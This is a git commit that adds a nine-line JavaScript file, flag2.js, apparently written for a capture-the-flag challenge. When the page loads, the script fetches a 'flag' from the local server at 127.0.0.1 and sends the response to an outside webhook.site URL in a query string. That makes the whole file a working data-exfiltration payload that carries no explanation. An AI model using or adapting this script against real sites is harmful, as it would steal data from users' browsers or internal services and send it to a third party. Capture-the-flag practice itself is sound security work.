6191df39bf7f53ddb33643edfc4806cedc919f5c
3nhj0 <97040301+3nhj0@users.noreply.github.com>
2023-09-30 14:54:14 +0800

    Create flag2.js

---
+++ flag2.js
@@ -0,0 +1,9 @@
+// script.js
+
+window.addEventListener('load', function() {
+    fetch('http://127.0.0.1/flag')
+        .then((response) => response.json())
+        .then((data) => {
+            fetch(`https://webhook.site/cc325d9e-af5f-4332-b501-c54004927828/?flag=${JSON.stringify(data)}`);
+        });
+});
